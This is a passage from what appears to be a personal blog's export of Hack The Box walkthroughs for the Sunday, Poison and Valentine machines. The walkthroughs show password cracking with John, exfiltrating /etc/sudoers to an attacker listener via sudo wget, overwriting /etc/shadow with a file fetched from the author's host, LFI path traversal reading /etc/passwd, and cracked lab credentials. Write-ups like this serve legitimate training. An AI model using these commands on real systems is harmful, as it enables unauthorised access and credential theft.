Program:/: aiuser❌61:61:AI User:/: ikeuser❌67:12:IKE Admin:/: lp❌71:8:Line Printer Admin:/:/bin/sh openldap❌75:75:OpenLDAP User:/:/usr/bin/pfbash webservd❌80:80:WebServer Reserved UID:/:/bin/sh unknown❌96:96:Unknown Remote UID:/:/bin/sh pkg5srv❌97:97:pkg(7) server UID:/: nobody❌60001:60001:NFS Anonymous Access User:/:/bin/sh noaccess❌60002:65534:No Access User:/:/bin/sh nobody4❌65534:65534:SunOS 4.x NFS Anonymous Access User:/:/bin/sh sammy❌100:10::/home/sammy:/usr/bin/bash sunny❌101:10::/home/sunny:/usr/bin/bash   Cracking with John for user sammy\n1 2 3 4 5  ╰─❯ cat passwd sammy❌100:10::/home/sammy:/usr/bin/bash ╰─❯ cat shadow sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::   1  ╰─❯ unshadow passwd shadow \u0026gt; unshadowed.txt   1 2  ╰─❯ cat unshadowed.txt sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB💯10::/home/sammy:/usr/bin/bash   1 2  ╰─❯ john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt\\ cooldude! (sammy)   Login info sammy : cooldude!\n1  su sammy   Privilege Escalation 1 2 3 4 5  sudo -l User sammy may run the following commands on sunday: (ALL) ALL (root) NOPASSWD: /usr/bin/wget   If the binary is allowed to run as superuser by sudo , it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n Fetch a remote file via HTTP GET request.  1 2 3  URL=http://attacker.com/file_to_get LFILE=file_to_save sudo wget $URL -O $LFILE   Ref: https://gtfobins.github.io/gtfobins/wget/#sudo\n1  ╰─❯ nc -lvnp 80 # Attacking machine   1  sammy@sunday:/usr/bin$ sudo wget --post-file=/etc/sudoers 10.10.14.21   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99  ## sudoers file. ## ## This file MUST be edited with the \u0026#39;visudo\u0026#39; command as root. ## Failure to use \u0026#39;visudo\u0026#39; may result in syntax or file permission errors ## that prevent sudo from running. ## ## See the sudoers man page for the details on how to write a sudoers file. ## ## ## Host alias specification ## ## Groups of machines. These may include host names (optionally with wildcards), ## IP addresses, network numbers or netgroups. # Host_Alias\tWEBSERVERS = www1, www2, www3 ## ## User alias specification ## ## Groups of users. These may consist of user names, uids, Unix groups, ## or netgroups. # User_Alias\tADMINS = millert, dowdy, mikef ## ## Cmnd alias specification ## ## Groups of commands. Often used to group related commands together. # Cmnd_Alias\tPROCESSES = /usr/bin/nice, /bin/kill, /usr/bin/renice, \\ # /usr/bin/pkill, /usr/bin/top # Cmnd_Alias\tREBOOT = /sbin/halt, /sbin/reboot, /sbin/poweroff ## ## Defaults specification ## ## You may wish to keep some of the following environment variables ## when running commands via sudo. ## ## Locale settings # Defaults env_keep += \u0026#34;LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET\u0026#34; ## ## Run X applications through sudo; HOME is used to find the ## .Xauthority file. Note that other programs use HOME to find  ## configuration files and this may lead to privilege escalation! # Defaults env_keep += \u0026#34;HOME\u0026#34; ## ## X11 resource path settings # Defaults env_keep += \u0026#34;XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH\u0026#34; ## ## Desktop path settings # Defaults env_keep += \u0026#34;QTDIR KDEDIR\u0026#34; ## ## Allow sudo-run commands to inherit the callers\u0026#39; ConsoleKit session # Defaults env_keep += \u0026#34;XDG_SESSION_COOKIE\u0026#34; ## ## Uncomment to enable special input methods. Care should be taken as ## this may allow users to subvert the command being run via sudo. # Defaults env_keep += \u0026#34;XMODIFIERS GTK_IM_MODULE QT_IM_MODULE QT_IM_SWITCHER\u0026#34; ## ## Uncomment to use a hard-coded PATH instead of the user\u0026#39;s to find commands # Defaults secure_path=\u0026#34;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0026#34; ## ## Uncomment to send mail if the user does not enter the correct password. # Defaults mail_badpass ## ## Uncomment to enable logging of a command\u0026#39;s output, except for ## sudoreplay and reboot. Use sudoreplay to play back logged sessions. # Defaults log_output # Defaults!/usr/bin/sudoreplay !log_output # Defaults!/usr/local/bin/sudoreplay !log_output # Defaults!REBOOT !log_output ## ## Runas alias specification ## ## ## User privilege specification ## root ALL=(ALL) ALL ## Uncomment to allow members of group wheel to execute any command # %wheel ALL=(ALL) ALL ## Same thing without a password # %wheel ALL=(ALL) NOPASSWD: ALL ## Uncomment to allow members of group sudo to execute any command # %sudo\tALL=(ALL) ALL ## Uncomment to allow any user to run sudo if they know the password ## of the user they are running the command as (root by default). # Defaults targetpw # Ask for the password of the target user # ALL ALL=(ALL) ALL # WARNING: only use this together with \u0026#39;Defaults targetpw\u0026#39; ## Read drop-in files from /etc/sudoers.d ## (the \u0026#39;#\u0026#39; here does not indicate a comment) #includedir /etc/sudoers.d sammy ALL=(root) NOPASSWD: /usr/bin/wget sunny ALL=(root) NOPASSWD: /root/troll   You can copy and save the file and edit the permissions for sammy and sunny to ALL to abuse the sudo privileges.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99  ## sudoers file. ## ## This file MUST be edited with the \u0026#39;visudo\u0026#39; command as root. ## Failure to use \u0026#39;visudo\u0026#39; may result in syntax or file permission errors ## that prevent sudo from running. ## ## See the sudoers man page for the details on how to write a sudoers file. ## ## ## Host alias specification ## ## Groups of machines. These may include host names (optionally with wildcards), ## IP addresses, network numbers or netgroups. # Host_Alias\tWEBSERVERS = www1, www2, www3 ## ## User alias specification ## ## Groups of users. These may consist of user names, uids, Unix groups, ## or netgroups. # User_Alias\tADMINS = millert, dowdy, mikef ## ## Cmnd alias specification ## ## Groups of commands. Often used to group related commands together. # Cmnd_Alias\tPROCESSES = /usr/bin/nice, /bin/kill, /usr/bin/renice, \\ # /usr/bin/pkill, /usr/bin/top # Cmnd_Alias\tREBOOT = /sbin/halt, /sbin/reboot, /sbin/poweroff ## ## Defaults specification ## ## You may wish to keep some of the following environment variables ## when running commands via sudo. ## ## Locale settings # Defaults env_keep += \u0026#34;LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET\u0026#34; ## ## Run X applications through sudo; HOME is used to find the ## .Xauthority file. Note that other programs use HOME to find  ## configuration files and this may lead to privilege escalation! # Defaults env_keep += \u0026#34;HOME\u0026#34; ## ## X11 resource path settings # Defaults env_keep += \u0026#34;XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH\u0026#34; ## ## Desktop path settings # Defaults env_keep += \u0026#34;QTDIR KDEDIR\u0026#34; ## ## Allow sudo-run commands to inherit the callers\u0026#39; ConsoleKit session # Defaults env_keep += \u0026#34;XDG_SESSION_COOKIE\u0026#34; ## ## Uncomment to enable special input methods. Care should be taken as ## this may allow users to subvert the command being run via sudo. # Defaults env_keep += \u0026#34;XMODIFIERS GTK_IM_MODULE QT_IM_MODULE QT_IM_SWITCHER\u0026#34; ## ## Uncomment to use a hard-coded PATH instead of the user\u0026#39;s to find commands # Defaults secure_path=\u0026#34;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0026#34; ## ## Uncomment to send mail if the user does not enter the correct password. # Defaults mail_badpass ## ## Uncomment to enable logging of a command\u0026#39;s output, except for ## sudoreplay and reboot. Use sudoreplay to play back logged sessions. # Defaults log_output # Defaults!/usr/bin/sudoreplay !log_output # Defaults!/usr/local/bin/sudoreplay !log_output # Defaults!REBOOT !log_output ## ## Runas alias specification ## ## ## User privilege specification ## root ALL=(ALL) ALL ## Uncomment to allow members of group wheel to execute any command # %wheel ALL=(ALL) ALL ## Same thing without a password # %wheel ALL=(ALL) NOPASSWD: ALL ## Uncomment to allow members of group sudo to execute any command # %sudo\tALL=(ALL) ALL ## Uncomment to allow any user to run sudo if they know the password ## of the user they are running the command as (root by default). # Defaults targetpw # Ask for the password of the target user # ALL ALL=(ALL) ALL # WARNING: only use this together with \u0026#39;Defaults targetpw\u0026#39; ## Read drop-in files from /etc/sudoers.d ## (the \u0026#39;#\u0026#39; here does not indicate a comment) #includedir /etc/sudoers.d sammy ALL=(root) NOPASSWD: /usr/bin/wget sunny ALL=(root) NOPASSWD: /root/troll   Make sure to start a listener to transfer this file\n1  sudo wget -O /etc/sudoers http://10.10.14.21:8000/badsudoers --output-document=sudoers   We can overwrite /etc/shadow since there is not a root entry while inspecting the .bash_history file\n1 2 3 4 5 6 7 8 9 10 11  sunny@sunday:~$ cat /backup/shadow.backup mysql:NP::::::: openldap:*LK*::::::: webservd:*LK*::::::: postgres:NP::::::: svctag:*LK*:6445:::::: nobody:*LK*:6445:::::: noaccess:*LK*:6445:::::: nobody4:*LK*:6445:::::: sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445:::::: sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::   You can perform this within sammy since it is allowed to run sudo wget\n1 2 3 4 5 6 7 8 9 10 11 12 13  nano malicious_shadow ------ root:sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445:::::: mysql:NP::::::: openldap:*LK*::::::: webservd:*LK*::::::: postgres:NP::::::: svctag:*LK*:6445:::::: nobody:*LK*:6445:::::: noaccess:*LK*:6445:::::: nobody4:*LK*:6445:::::: sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445:::::: sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::   1  python -m HttpSimpleServer   1  sudo wget -O /etc/shadow http://10.10.14.32:8000/malicious_shadow   1 2 3  sudo su password: cooldude! # password for sammy// Some code   I am are root !\nYou could also give a different password with openssl\n1 2  openssl passwd -1 -salt secret password # in your kali machiune $1$secret$SChraBdvk.0AuolTngkGM.   append again to the file and send it via wget\n1 2 3 4 5 6 7 8 9 10 11  root:$1$secret$SChraBdvk.0AuolTngkGM.:6445:::::: mysql:NP::::::: openldap:*LK*::::::: webservd:*LK*::::::: postgres:NP::::::: svctag:*LK*:6445:::::: nobody:*LK*:6445:::::: noaccess:*LK*:6445:::::: nobody4:*LK*:6445:::::: sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445:::::: sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::   1 2  su root password # we get root   Skills Learned  Enumerating users through Finger Brute forcing SSH Exploiting Sudo NOPASSWD  ","description":"Sunday is a fairly simple machine, however it uses fairly old software and can be a bit unpredictable at times. It mainly focuses on exploiting the Finger service as well as the use of weak credentials.","id":10,"section":"posts","tags":["Hackthebox","OSCP","finger","web","network","protocols","authentication","ssh","reconnaissance","user enumeration","password cracking","brute force attack","sudo exploitation","weak credentials","misconfiguration"],"title":"Hackthebox - Sunday","uri":"https://hswootan.github.io/en/posts/sunday/"},{"content":"\r\rEnumeration 1  nmap -sV -sC -vv 10.10.10.84 -oN poison_scan.txt   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0) | ssh-hostkey: | 2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDFLpOCLU3rRUdNNbb5u5WlP+JKUpoYw4znHe0n4mRlv5sQ5kkkZSDNMqXtfWUFzevPaLaJboNBOAXjPwd1OV1wL2YFcGsTL5MOXgTeW4ixpxNBsnBj67mPSmQSaWcudPUmhqnT5VhKYLbPk43FsWqGkNhDtbuBVo9/BmN+GjN1v7w54PPtn8wDd7Zap3yStvwRxeq8E0nBE4odsfBhPPC01302RZzkiXymV73WqmI8MeF9W94giTBQS5swH6NgUe4/QV1tOjTct/uzidFx+8bbcwcQ1eUgK5DyRLaEhou7PRlZX6Pg5YgcuQUlYbGjgk6ycMJDuwb2D5mJkAzN4dih | 256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKXh613KF4mJTcOxbIy/3mN/O/wAYht2Vt4m9PUoQBBSao16RI9B3VYod1HSbx3PYsPpKmqjcT7A/fHggPIzDYU= | 256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJrg2EBbG5D2maVLhDME5mZwrvlhTXrK7jiEI+MiZ+Am 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32) |_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-title: Site doesn\u0026#39;t have a title (text/html; charset=UTF-8). Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd   1  nmap -A 10.10.10.84   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0) | ssh-hostkey: | 2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA) | 256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA) |_ 256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519) 80/tcp open http Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32) |_http-title: Site doesn\u0026#39;t have a title (text/html; charset=UTF-8). |_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32 No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.92%E=4%D=4/26%OT=22%CT=1%CU=31558%PV=Y%DS=2%DC=T%G=Y%TM=6268177 OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10C%TI=Z%CI=Z%II=RI%TS=21)O OS:PS(O1=M505NW6ST11%O2=M505NW6ST11%O3=M280NW6NNT11%O4=M505NW6ST11%O5=M218N OS:W6ST11%O6=M109ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFFF)E OS:CN(R=Y%DF=Y%T=40%W=FFFF%O=M505NW6SLL%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F OS:=AS%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=FFFF%S=O%A=S+%F=AS%O=M109NW6ST11%R OS:D=0%Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0% OS:S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7( OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=38%UN=0% OS:RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=S%T=40%CD=S) Network Distance: 2 hops Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd TRACEROUTE (using port 8080/tcp) HOP RTT ADDRESS 1 15.76 ms 10.10.14.1 2 15.86 ms 10.10.10.84   Exploitation Testing for LFI 1  http://10.10.10.84/browse.php?file=../../../../../../etc/passwd   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  # $FreeBSD: releng/11.1/etc/master.passwd 299365 2016-05-10 12:47:36Z bcr $ # root:*:0:0:Charlie \u0026amp;:/root:/bin/csh toor:*:0:0:Bourne-again Superuser:/root: daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin operator:*:2:5:System \u0026amp;:/:/usr/sbin/nologin bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin games:*:7:13:Games pseudo-user:/:/usr/sbin/nologin news:*:8:8:News Subsystem:/:/usr/sbin/nologin man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin unbound:*:59:59:Unbound DNS Resolver:/var/unbound:/usr/sbin/nologin proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin _pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin _dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin auditdistd:*:78:77:Auditdistd unprivileged user:/var/empty:/usr/sbin/nologin www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin _ypldap:*:160:160:YP LDAP unprivileged user:/var/empty:/usr/sbin/nologin hast:*:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin _tss:*:601:601:TrouSerS user:/var/empty:/usr/sbin/nologin messagebus:*:556:556:D-BUS Daemon User:/nonexistent:/usr/sbin/nologin avahi:*:558:558:Avahi Daemon User:/nonexistent:/usr/sbin/nologin cups:*:193:193:Cups Owner:/nonexistent:/usr/sbin/nologin charix:*:1001:1001:charix:/home/charix:/bin/csh   1  http://10.10.10.84/browse.php?file=phpinfo.php   1  http://10.10.10.84/browse.php?file=ini.php   1  http://10.10.10.84/browse.php?file=listfiles.php   1 2 3 4 5 6 7 8 9 10 11 12  Array ( [0] =\u0026gt; . [1] =\u0026gt; .. [2] =\u0026gt; browse.php [3] =\u0026gt; index.php [4] =\u0026gt; info.php [5] =\u0026gt; ini.php [6] =\u0026gt; listfiles.php [7] =\u0026gt; phpinfo.php [8] =\u0026gt; pwdbackup.txt )   1  http://10.10.10.84/browse.php?file=pwdbackup.txt   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  This password is secure, it\u0026#39;s encoded atleast 13 times.. what could go wrong really.. Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0 NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO Ukd4RVdub3dPVU5uUFQwSwo=   1 2 3 4 5 6 7 8 9  base64_decode.py ------ import base64 coded_string = \u0026#39;\u0026#39;\u0026#39;Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU bGhoTVVwVVZtcEdZV015U2tWVQpiR2hv\u0026gt; for i in range(0,13): coded_string = base64.b64decode(coded_string) print(coded_string)   1 2  python3 base64_decode.py -\u0026gt; b\u0026#39;Charix!2#4%6\u0026amp;8(0\u0026#39;   Found user charix possible for ssh login\n1 2  user: charix password: Charix!2#4%6\u0026amp;8(0    Found a secret.zip file. We can transfer it to our own machine  1 2 3 4  charix@Poison:~ % which python /usr/local/bin/python charix@Poison:~ % python -m SimpleHTTPServer    secret.zip contains a password  1 2  wget http://10.10.10.84:8000/secret.zip ./ unzip secret.zip   Privilege Escalation  Looking at processes  1  ps -auxw   We see something about XVNC I didn’t know what was it but googling is a server based on a standard X server.\n1  netstat -an   I came across this amazing guide how to pentest VNC. https://book.hacktricks.xyz/pentesting/pentesting-vnc\n Looks we have a secret, it might be the password so we will decrypt using vncpwd: https://github.com/jeroennijhof/vncpwd  Decrypt the VNC password file\n1 2 3 4 5  ./vncpwd ../secret -\u0026gt; Password: VNCP@$$! vncviewer localhost:5901 Enter password: VNCP@$$!   Connect to VNC\n1 2 3 4 5  ssh -L 5901:localhost:5901 USER@REMOTE_IP ssh -L 5901:localhost:5901 charix@10.10.10.84 password: Charix!2#4%6\u0026amp;8(0   1  vncviewer -passwd secret localhost:5901   Skills Learned  Apache log poisoning Tunneling ports over SSH  ","description":"Poison is a fairly easy machine which focuses mainly on log poisoning and port forwarding/tunneling. The machine is running FreeBSD which presents a few challenges for novice users as many common binaries from other distros are not available.","id":11,"section":"posts","tags":["Hackthebox","OSCP","apache","vnc","web","network","vulnerability assessment","injection","authentication","tunneling","password reuse","port forwarding","local file inclusion","clear text credentials","weak authentication","log poisoning"],"title":"Hackthebox - Poison","uri":"https://hswootan.github.io/en/posts/poison/"},{"content":"\r\rEnumeration 1  nmap -sV -sC -vv 10.10.10.79 -oN valentine_scan.txt   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51  PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA) | ssh-dss AAAAB3NzaC1kc3MAAACBAIMeSqrDdAOhxf7P1IDtdRqun0pO9pmUi+474hX6LHkDgC9dzcvEGyMB/cuuCCjfXn6QDd1n16dSE2zeKKjYT9RVCXJqfYvz/ROm82p0JasEdg1z6QHTeAv70XX6cVQAjAMQoUUdF7WWKWjQuAknb4uowunpQ0yGvy72rbFkSTmlAAAAFQDwWVA5vTpfj5pUCUNFyvnhy3TdcQAAAIBFqVHk74mIT3PWKSpWcZvllKCGg5rGCCE5B3jRWEbRo8CPRkwyPdi/hSaoiQYhvCIkA2CWFuAeedsZE6zMFVFVSsHxeMe55aCQclfMH4iuUZWrg0y5QREuRbGFM6DATJJFkg+PXG/OsLsba/BP8UfcuPM+WGWKxjuaoJt6jeD8iQAAAIBg9rgf8NoRfGqzi+3ndUCo9/m+T18pn+ORbCKdFGq8Ecs4QLeaXPMRIpCol11n6va090EISDPetHcaMaMcYOsFqO841K0O90BV8DhyU4JYBjcpslT+A2X+ahj2QJVGqZJSlusNAQ9vplWxofFONa+IUSGl1UsGjY0QGsA5l5ohfQ== | 2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDRkMHjbGnQ7uoYx7HPJoW9Up+q0NriI5g5xAs1+0gYBVtBqPxi86gPtXbMHGSrpTiX854nsOPWA8UgfBOSZ2TgWeFvmcnRfUKJG9GR8sdIUvhKxq6ZOtUePereKr0bvFwMSl8Qtmo+KcRWvuxKS64RgUem2TVIWqStLJoPxt8iDPPM7929EoovpooSjwPfqvEhRMtq+KKlqU6PrJD6HshGdjLjABYY1ljfKakgBfWic+Y0KWKa9qdeBF09S7WlaUBWJ5SutKlNSwcRBBVbL4ZFcHijdlXCvfVwSVMkiqY7x4V4McsNpIzHyysZUADy8A6tbfSgopaeR2UN4QRgM1dX | 256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA) |_ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+pCNI5Xv8P96CmyDi/EIvyL0LVZY2xAUJcA0G9rFdLJnIhjvmYuxoCQDsYl+LEiKQee5RRw9d+lgH3Fm5O9XI= 80/tcp open http syn-ack ttl 63 Apache httpd 2.2.22 ((Ubuntu)) |_http-title: Site doesn\u0026#39;t have a title (text/html). | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.2.22 (Ubuntu) 443/tcp open ssl/http syn-ack ttl 63 Apache httpd 2.2.22 ((Ubuntu)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_ssl-date: 2022-03-18T02:23:30+00:00; +1m19s from scanner time. |_http-title: Site doesn\u0026#39;t have a title (text/html). | ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US | Issuer: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha1WithRSAEncryption | Not valid before: 2018-02-06T00:45:25 | Not valid after: 2019-02-06T00:45:25 | MD5: a413 c4f0 b145 2154 fb54 b2de c7a9 809d | SHA-1: 2303 80da 60e7 bde7 2ba6 76dd 5214 3c3c 6f53 01b1 | -----BEGIN CERTIFICATE----- | MIIDZzCCAk+gAwIBAgIJAIXsbfXFhLHyMA0GCSqGSIb3DQEBBQUAMEoxCzAJBgNV | BAYTAlVTMQswCQYDVQQIDAJGTDEWMBQGA1UECgwNdmFsZW50aW5lLmh0YjEWMBQG | A1UEAwwNdmFsZW50aW5lLmh0YjAeFw0xODAyMDYwMDQ1MjVaFw0xOTAyMDYwMDQ1 | MjVaMEoxCzAJBgNVBAYTAlVTMQswCQYDVQQIDAJGTDEWMBQGA1UECgwNdmFsZW50 | aW5lLmh0YjEWMBQGA1UEAwwNdmFsZW50aW5lLmh0YjCCASIwDQYJKoZIhvcNAQEB | BQADggEPADCCAQoCggEBAMMoF6z4GSpB0oo/znkcGfT7SPrTLzNrb8ic+aO/GWao | oY35ImIO4Z5FUB9ZL6y6lc+vI6pUyWRADyWoxd3LxByHDNJzEi53ds+JSPs5SuH1 | PUDDtZqCaPaNjLJNP08DCcC6rXRdU2SwV2pEDx+39vsFiK6ywcrepvvFZndGKXVg | 0K+R3VkwOguPhSHlXcgiHFbqei8NJ1zip9YuVUYXhyLVG2ZiJYX6CRw4bRsUnql6 | 4DFNQybOsJHm0JtI2M9PefmvEkTUZeT/d0dWhU076a3bTestKZf4WpqZw60XGmxz | pAQf5dWOqMemIK6K4FC48bLSSN59s4kNtuhtx6OCXpcCAwEAAaNQME4wHQYDVR0O | BBYEFNzWWyJscuATyFWyfLR2Yev1T435MB8GA1UdIwQYMBaAFNzWWyJscuATyFWy | fLR2Yev1T435MAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQEFBQADggEBACc3NjB7 | cHUXjTxwdeFxkY0EFYPPy3EiHftGVLpiczrEQ7NiHTLGQ6apvxdlShBBhKWRaU+N | 